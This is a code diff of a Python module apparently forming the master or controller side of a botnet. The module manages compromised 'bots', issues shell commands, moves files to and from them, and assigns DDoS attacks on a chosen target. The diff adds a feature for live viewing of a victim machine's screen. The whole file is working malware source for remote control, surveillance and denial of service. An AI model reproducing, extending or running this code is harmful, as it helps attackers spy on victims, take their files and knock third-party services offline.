@@ -2,20 +2,66 @@
 # Author: Pure-L0G1C
 # Description: Interface for the master
 
-from os import path
 from re import match
 from lib import const
-from . import ssh, sftp
 from hashlib import sha256
-from time import time, sleep  
+from time import time, sleep
 from os import urandom, path
 from threading import Thread
 from datetime import datetime
+from os import getcwd, path, remove
+from . import ssh, sftp, sscreenshare
+
+######## Screenshare ########
+
+
+class ScreenShare:
+
+    screen_src = path.join(getcwd(), 'templates', 'screen.html')
+
+    def __init__(self, bot, update):
+        self.sscreenshare = sscreenshare.SScreenShare(
+            const.PRIVATE_IP,
+            const.FTP_PORT
+        )
+
+        self.bot_id = bot['bot_id']
+        self.shell = bot['shell']
+        self.update = update
+
+    @property
+    def is_alive(self):
+        return self.sscreenshare.is_alive
+
+    def start(self, code):
+        print('Starting screenshare ...')
+
+        self.shell.send(code=code, args=self.update)
+        Thread(target=self.sscreenshare.start, daemon=True).start()
+
+    def stop(self):
+        print('Stopping screenshare ...')
+
+        self.shell.send(code=16)
+        self.sscreenshare.stop()
+
+        if path.exists(ScreenShare.screen_src):
+            try:
+                remove(ScreenShare.screen_src)
+            except:
+                pass
+
+    def close(self):
+        self.stop()
+
+
+######## FTP ########
 
 class FTP(object):
 
     def __init__(self, file, bot, download=True):
-        self.sftp = sftp.sFTP(const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
+        self.sftp = sftp.sFTP(
+            const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
         self.bot_id = bot['bot_id']
         self.shell = bot['shell']
         self.download = download
@@ -25,11 +71,15 @@ class FTP(object):
         self.file = file
 
     def send(self, code, file=None):
-        if not path.exists(file):return
+        if not path.exists(file):
+            return
+
         self.shell.send(code=code, args=file)
         self.is_alive = True
+
         self.sftp.send(file)
         self.is_alive = False
+
         self.time = self.sftp.time_elapsed
         self.success = True if self.sftp.error_code != -1 else False
 
@@ -43,8 +93,10 @@ class FTP(object):
 
     def close(self):
         self.sftp.close()
+        self.is_alive = False
 
 ######## Tasks #########
+
 
 class Task(object):
 
@@ -61,6 +113,7 @@ class Task(object):
         for bot in [bots[bot] for bot in bots]:
             bot['shell'].send(11)
 
+
 class TaskDdos(object):
 
     def __init__(self, target, threads):
@@ -69,12 +122,15 @@ class TaskDdos(object):
         self.time_assigned = time()
 
     def info(self):
-        time_assigned = datetime.fromtimestamp(self.time_assigned).strftime('%b %d, %Y at %I:%M %p')
-        a = 'Task name: Ddos Attack\nTime assigned: {}\n\n'.format(time_assigned)
+        time_assigned = datetime.fromtimestamp(
+            self.time_assigned).strftime('%b %d, %Y at %I:%M %p')
+        a = 'Task name: Ddos Attack\nTime assigned: {}\n\n'.format(
+            time_assigned)
         b = 'Target: {}\nThreads: {}'.format(self.target, self.threads)
         return a + b
 
 ######## Interface ########
+
 
 class Interface(object):
 
@@ -83,22 +139,31 @@ class Interface(object):
         self.ssh = None
         self.ftp = None
         self.task = None
+        self.screenshare = None
         self.sig = self.signature
 
     def close(self):
         if self.ftp:
             self.ftp.close()
             self.ftp = None
+
         if self.ssh:
             self.ssh.close()
             self.ssh = None
+
+        if self.screenshare:
+            self.screenshare.close()
+            self.screenshare = None
+
         self.disconnect_all()
 
     def gen_bot_id(self, uuid):
         bot_ids = [self.bots[bot]['bot_id'] for bot in self.bots]
         while 1:
-            bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)).digest().hex() + uuid).encode()).digest().hex()
-            if not bot_id in bot_ids:break
+            bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)
+                                    ).digest().hex() + uuid).encode()).digest().hex()
+            if not bot_id in bot_ids:
+                break
         return bot_id
 
     @property
@@ -123,7 +188,8 @@ class Interface(object):
             self.close_sess(sess_obj, shell)
         else:
             bot_id = self.gen_bot_id(uuid)
-            self.bots[sess_obj] = { 'bot_id': bot_id, 'uuid': uuid, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
+            self.bots[sess_obj] = {'bot_id': bot_id, 'uuid': uuid,
+                                   'intel': conn_info['args'], 'shell': shell, 'session': sess_obj}
             self.sig = self.signature
             print(self.bots)
             if self.task:
@@ -132,7 +198,7 @@ class Interface(object):
     def close_sess(self, sess_obj, shell_obj):
         print('Closing session ...')
         shell_obj.is_alive = False
-        shell_obj.send(code=7, args=None) # 7 - disconnect
+        shell_obj.send(code=7, args=None)  # 7 - disconnect
 
         sess_obj.close()
         if sess_obj in self.bots:
@@ -170,7 +236,8 @@ class Interface(object):
             if self.ssh:
                 self.ssh.close()
 
-            self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT, max_time=30, verbose=True)
+            self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT,
+                               max_time=30, verbose=True)
             sock_obj = self.ssh.start()
 
             if sock_obj:
@@ -199,15 +266,23 @@ class Interface(object):
         if self.ftp:
             if all([self.ftp.is_alive, not override]):
                 return 'Already {} {} {} {}. Use --override option to override this process'.format('Downloading' if self.ftp.download else 'Uploading',
-                                           self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
-            else:
-                self.ftp.close()
+                                                                                                    self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
+            self.ftp.close()
+            del self.ftp
+
+        if self.screenshare:
+            if self.screenshare.is_alive and not override:
+                return 'Viewing the screen of {}. Use --override option to override this process'.format(
+                    self.screenshare.bot_id[:8]
+                )
+
+            self.screenshare.close()
+            del self.screenshare
+            self.screenshare = None
 
         self.ftp = FTP(file, bot, download=False if cmd_id == 3 else True)
         ftp_func = self.ftp.send if cmd_id == 3 else self.ftp.recv
-        ftp_thread = Thread(target=ftp_func, args=[cmd_id, file])
-        ftp_thread.daemon = True
-        ftp_thread.start()
+        Thread(target=ftp_func, args=[cmd_id, file], daemon=True).start()
 
         return '{} process started successfully'.format('Download' if self.ftp.download else 'Upload')
 
@@ -216,11 +291,95 @@ class Interface(object):
             return 'No file transfer in progress'
         if self.ftp.is_alive:
             return '{} {} {} {}. Check back in 1 minute'.format('Downloading' if self.ftp.download else 'Uploading',
-                                        self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
+                                                                self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
         else:
             return 'Attempted to {} {} {} {}. The process {} a success. Time-elapsed: {}(sec)'.format('download' if self.ftp.download else 'upload',
-                                        self.ftp.file, 'from' if self.ftp.download else 'to',
-                                        self.ftp.bot_id[:8], 'was' if self.ftp.success else 'was not', self.ftp.time)
+                                                                                                      self.ftp.file, 'from' if self.ftp.download else 'to',
+                                                                                                      self.ftp.bot_id[:8], 'was' if self.ftp.success else 'was not', self.ftp.time)
+
+    def write_screen_scr(self, update):
+        html = '''
+        <!DOCTYPE html>
+        <html lang="en">
+            <head>
+                <meta charset="UTF-8" />
+                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+                <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+                <title>Screenshare</title>
+            </head>
+            <body>
+                <div id="container">
+                    <img src="../static/img/screen.png" alt="" height="512" width="1024" id="img" />
+                </div>
+
+                <script>
+                    window.onload = function() {{
+                        var image = document.getElementById('img');
+
+                        function updateImage() {{
+                            image.src = image.src.split('?')[0] + '?' + new Date().getTime();
+                        }}
+
+                        setInterval(updateImage, {});
+                    }};    
+
+                    window.onfocus = function() {{
+                        location.reload();
+                    }};           
+                </script>
+
+                <style>
+                    body {{
+                        background: #191919;
+                    }}
+
+                    img {{
+                        border-radius: 5px;
+                    }}
+
+                    #container {{
+                        text-align: center;
+                        padding-top: 8%;
+                    }}
+                </style>
+            </body>
+        </html>
+        '''.format(update * 1000)
+
+        with open(ScreenShare.screen_src, 'wt') as f:
+            f.write(html)
+
+    def screenshare_obj(self, bot_id, cmd_id, update, override):
+        bot = self.get_bot(bot_id)
+
+        if not bot:
+            return ''
+
+        if self.ftp:
+            if self.ftp.is_alive and not override:
+                return 'Already {} {} {} {}. Use --override option to override this process'.format('Downloading' if self.ftp.download else 'Uploading',
+                                                                                                    self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
+            self.ftp.close()
+            del self.ftp
+            self.ftp = None
+
+        if self.screenshare:
+            if self.screenshare.is_alive and not override:
+                return 'Already viewing the screen of {}. Use --override option to override this process'.format(
+                    self.screenshare.bot_id[:8]
+                )
+
+            self.screenshare.close()
+            self.screenshare.update = update
+            self.screenshare.shell = bot['shell']
+            self.screenshare.bot_id = bot['bot_id']
+        else:
+            self.screenshare = ScreenShare(bot, update)
+
+        self.screenshare.start(cmd_id)
+        self.write_screen_scr(update)
+
+        return 'Screenshare is being hosted at the URL: {}'.format(ScreenShare.screen_src)
 
     def execute_cmd_by_id(self, bot_id, cmd_id, args):
         override = True if '--override' in args else False
@@ -234,6 +393,42 @@ class Interface(object):
 
         if cmd_id == 1:
             return self.ftp_status()
+
+        if cmd_id == 15:
+
+            update = ''.join(args[0]).strip()
+
+            if not update:
+                return 'Please provide an update time in seconds'
+
+            try:
+                update = float(update)
+            except ValueError:
+                return 'Please provide an integer for update time'
+
+            return self.screenshare_obj(bot_id, cmd_id, update, override)
+
+        if cmd_id == 16:
+            if not self.screenshare:
+                return 'Screenshare is inactive'
+
+            if not self.screenshare.is_alive:
+                return 'Screenshare is inactive'
+
+            self.screenshare.stop()
+            return 'Stopped screenshare ...'
+
+        if cmd_id == 17:
+            if not self.screenshare:
+                return 'Screenshare is inactive'
+
+            if not self.screenshare.is_alive:
+                return 'Screenshare is inactive'
+
+            return 'Viewing the screen of {}\nUpdating every {} seconds\nURL: {}'.format(
+                self.screenshare.bot_id[:8], self.screenshare.update, ScreenShare.screen_src
+            )
+
         elif any([cmd_id == 3, cmd_id == 4, cmd_id == 5]):
             return self.ftp_obj(bot_id, cmd_id, ' '.join(args[0:]) if cmd_id != 5 else 'a screenshot', override)
         else:
@@ -281,10 +476,10 @@ class Interface(object):
             return 'Failed to send command'
         cmd_id = int(cmd_id)
 
-        if cmd_id == 0: # stop task
+        if cmd_id == 0:  # stop task
             Thread(target=self.stop_task, daemon=True).start()
             return 'Task terminated' if self.task else 'No task is set'
-        elif cmd_id == 1: # status
+        elif cmd_id == 1:  # status
             return self.get_task()
         else:
             resp = self.set_task(cmd_id, args)
@@ -298,13 +493,13 @@ class Interface(object):
         return 'No task is set' if not self.task else self.task.task_info_obj.info()
 
     def set_task(self, task_id, args):
-        if task_id == 2: # ddos
+        if task_id == 2:  # ddos
             return self.set_ddos_task(args)
         else:
             return 'Failed to set task'
 
     def set_ddos_task(self, args):
-        task_id = 1 # the the bot side
+        task_id = 1  # the the bot side
         if not len(args) == 3:
             return 'Invalid amount of arguments'
 
